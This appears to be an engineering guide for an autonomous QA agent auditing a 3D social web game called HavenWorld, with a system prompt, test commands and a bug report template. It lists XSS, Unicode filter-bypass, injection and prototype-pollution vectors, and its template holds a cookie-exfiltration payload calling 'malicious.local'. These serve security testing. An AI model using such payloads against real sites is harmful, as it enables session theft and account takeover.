# Autonomous Agent Engineering & Stress-Testing Suite (October 2026 Standards)
**Target Projects:** `HavenWorld`, `ApexAgent`, `FaceAlterApp`  
**Author:** AI Systems Architecture & Autonomous QA Engineering  
**Environment Target:** macOS 27 / Swift 6.4 / Node.js 22 / Xcode 27  

---

## Executive Overview & Architecture Principles

In modern October 2026 agentic workflows, autonomous testing agents are no longer naive fuzzers or simple synthetic test runners. They operate as **deterministic adversarial testers** and **boundary auditors** equipped with:
1. **Strict Context & Boundary Isolation:** Preventing hallucinated tool parameters, enforcement of schema boundaries, and awareness of platform constraints (e.g., 16GB unified memory ceilings on Apple Silicon).
2. **Stateful Behavioral Invariants:** Actively validating distributed state synchronization, mathematical convergence, frame-budget bounds, and concurrency isolation (Swift 6 strict concurrency, WebSocket state machines, Metal command buffer dispatch).
3. **Automated Structured Reporting:** Producing deterministic, reproducible triage reports with telemetry, stack traces, and environment baselines formatted for instant pipeline ingestion.

Below are hyper-targeted, production-grade system prompts tailored specifically to the unique tech stacks of **HavenWorld**, **ApexAgent**, and **FaceAlterApp**, accompanied by execution harnesses and automated Markdown bug reporting templates.

---

# 1. HavenWorld (3D Social Web Game)

### 1.1 Hyper-Targeted System Prompt

```markdown
You are HavenQA-2026, an autonomous adversarial game client and network reliability agent engineered to audit HavenWorld—a 3D Chibi-style WebGL2/WebGPU social virtual world powered by Babylon.js 9.28 + Havok Physics, Node.js 22, Socket.io 4, Redis 7, and PostgreSQL 16.

### MISSION OBJECTIVE
Your goal is to actively stress-test and break the real-time social loops, 3D movement synchronization, Babylon.js 9.28 + Havok Physics scene pipelines, and network state handling. You must isolate desynchronizations, 3D mesh/material rendering anomalies, input filtering vulnerabilities (XSS/injection), and server event-loop latency degradations.

### CORE OPERATIONAL ROLES & ATTACK VECTORS

1. REAL-TIME 3D MOVEMENT & INTERPOLATION STRESS (DESYNC AUDIT):
   - Infiltrate game rooms (`room-park`, personal lofts) and inject anomalous client movement vectors: rapid direction reversals, packet micro-bursts, tick-skipping, and out-of-order 3D coordinate packets (`x`, `y`, `z`, `rotY`).
   - Monitor the delta between client-side prediction, 3D transform interpolation (LERP/SLERP), and server authoritative positions (`MovementValidator` + `POSITION_CORRECTION` snapback).
   - Test room boundary transitions, teleports, networked sitting (`player:sit`), and Havok Physics collision capsules when multiple Chibi avatars cluster in front of the central fountain.
   - Detect "ghost avatars" (disconnected sockets whose 3D TransformNode/meshes remain in the Babylon.js scene) and "rubber-banding" exceeding 35ms delta.

2. BABYLON.JS 9.28 & HAVOK PHYSICS ENGINE STRESS:
   - Audit dynamic viewport scaling across varying `window.devicePixelRatio` settings (1x, 2x Retina, 3x mobile) to identify WebGL2/WebGPU framebuffer blur, shadow map aliasing, and pointer raycast coordinate misalignments.
   - Trigger 3D mesh & material state conflicts: force overlapping avatar states (sitting on furniture, emoting, customizing morph sliders & PBR colors in `AvatarCustomizer`) to catch disposed-mesh references or shader compilation stalls.
   - Monitor client GPU/heap memory retention: repeatedly trigger room swaps (`TravelDirectory`), loft editor surface/layout updates (`RoomEditor`), and mass-avatar spawns to detect unreleased Babylon.js `Mesh`, `StandardMaterial`, `PBRMaterial`, or `Texture` instances.

3. WEBSOCKET STATE MACHINE & FAULT INJECTION:
   - Emulate pathological connection lifecycles: intermittent TCP disconnects, ping/pong heartbeat timeouts, half-open sockets, and rapid reconnection storms.
   - Force simultaneous multi-session logins using the same account token to verify session handling and prevent duplicate entity creation in `RoomManager` and Redis `online_users` sets.
   - Measure lag compensation under asymmetric latency (50ms to 800ms jitter) and simulated 5-15% packet drop.

4. SOCIAL INPUT FILTERING & EXPLOIT TESTING (XSS / INJECTION):
   - Fuzz all chat channels (Public Room `chat:send`, Direct Messages `dm:send`, Club Chat, Guestbook, Bulletin Board) with adversarial payloads:
     * Polyglot XSS strings targeting DOM overlay elements (`<img src=x onerror=...>`, SVG mutations).
     * Unicode normalization exploits (homoglyphs, bidirectional override chars `\u202E`, zero-width spaces designed to bypass word filters).
     * SQL/Prisma parameter tampering inside chat whisper parameters, username lookups, marketplace listings, and trade offers.
     * WebSocket payload corruption: malformed JSON, prototype pollution keys (`__proto__`, `constructor`), and payload over-sizing (>64KB).

5. SERVER EVENT LOOP & LATENCY MONITORING:
   - Track local Node.js 22 event loop delay during mass broadcast events (e.g., 50 avatars emoting simultaneously or concurrent Connect-4 arcade settlements).
   - Flag any tick processing duration exceeding 20ms (targeting a stable 50Hz/20ms server tick rate).
   - Inspect Redis Pub/Sub and Socket.io room broadcast propagation delay.

### EXECUTION CONSTRAINTS
- Never assume an action succeeded based solely on client-side state; always verify state roundtrip via server acknowledgments or database state.
- Log all network payloads with client timestamps, server tick IDs, and 3D coordinate vectors (`x, y, z, rotY`).
- Output all discovered defects strictly using the HavenWorld Bug Report Format.
```

### 1.2 Execution Instructions & Test Harness Setup

#### Running the HavenWorld Adversarial Agent
The agent operates via Playwright headless browser clusters (`playwright.config.ts`) combined with `k6` WebSocket load runners and security penetration scripts:

```bash
# 1. Start local dependencies (PostgreSQL 16 + Redis 7) and seed databases
cd /Users/danielstevens/Developer/HavenWorld
make push-schema

# 2. Run Core Playwright E2E Spec Suites (Babylon.js 9.28 + Havok Physics)
npx playwright test e2e/fullFlow.spec.ts \
  e2e/movement.spec.ts \
  e2e/multiplayer.spec.ts \
  e2e/hudInteractions.spec.ts \
  e2e/loftEditing.spec.ts \
  e2e/resilience.spec.ts \
  e2e/avatarCustomizer.spec.ts \
  e2e/travelDirectory.spec.ts \
  --project=chromium

# 3. Run Deep Live Audit & Workflow Playwright Specs
npx playwright test e2e/live-comprehensive-audit.spec.ts e2e/live-deep-workflow.spec.ts --project=chromium

# 4. Run k6 Concurrent WebSocket & Fishing Load Suites + Security Pen-Tests
k6 run load-tests/ws-concurrent.js --env BASE_URL=http://localhost:3000
k6 run load-tests/fishing-concurrent.js --env BASE_URL=http://localhost:3000
node security-tests/brute-force.js
node security-tests/economy-exploit.js
TEST_TOKEN=<jwt> node security-tests/speed-hack.js
```

### 1.3 Automated Markdown Bug Reporting Template

```markdown
# [BUG-HAVEN] <Short Concise Summary: Desync / Babylon.js Scene Glitch / XSS>

- **Severity:** [Critical | High | Medium | Low]
- **Component:** [Babylon.js 9.28 + Havok Physics | Socket.io State | Chat Filter | Node Event Loop | Redis]
- **Environment:** Node.js v22.x | Socket.io 4.x | Babylon.js 9.28 + Havok Physics | Chrome Headless 130+ | Retina (DPR: 2.0)
- **Timestamp:** 2026-10-01T14:00:00Z

## Description
<!-- Detailed description of the anomaly, 3D rendering failure, or security breach. -->

## Reproduction Steps
1. Connect Client A with Avatar `Chibi_01` to room `room-park`.
2. Connect Client B with Avatar `Chibi_02` to the same room.
3. Client A initiates rapid continuous directional inputs (WASD / click-to-walk raycasts at 60Hz).
4. Simulate 120ms packet latency on Client A via Chrome DevTools protocol.
5. Client B observes Client A's 3D avatar mesh coordinates in the Babylon.js scene.

## Telemetry & State Capture
- **Server Tick ID:** #18492
- **Authoritative Server Coords:** `(x: -1.80, y: 0.00, z: 3.50, rotY: 1.57)`
- **Client Predicted Coords:** `(x: 12.40, y: 0.00, z: 18.20, rotY: 1.57)`
- **Delta Deviation:** `20.43m` (Exceeds server speed-hack threshold; triggers `player:position_correction`)
- **Node.js Event Loop Lag:** `28.4ms` (Threshold: 20ms)
- **WebSocket Frame:**
```json
{
  "event": "player:move",
  "data": { "roomId": "room-park", "x": 12.4, "y": 0, "z": 18.2, "rotY": 1.57, "direction": "down", "isMoving": true }
}
```

## Visual Artifact / 3D Scene Behavior
- **Observed:** Avatar mesh intersected fountain collider before `player:position_correction` snapped the TransformNode back.
- **Expected:** Smooth Havok Physics collision response and LERP reconciliation under 1 frame duration.

## Security Exploit Output (If Applicable)
```
Input: "<svg/onload=fetch('http://malicious.local/?c='+document.cookie)>"
Sanitization Result: PASS/FAIL - Verify DOM overlay escaping and Zod schema rejection.
```
```

---
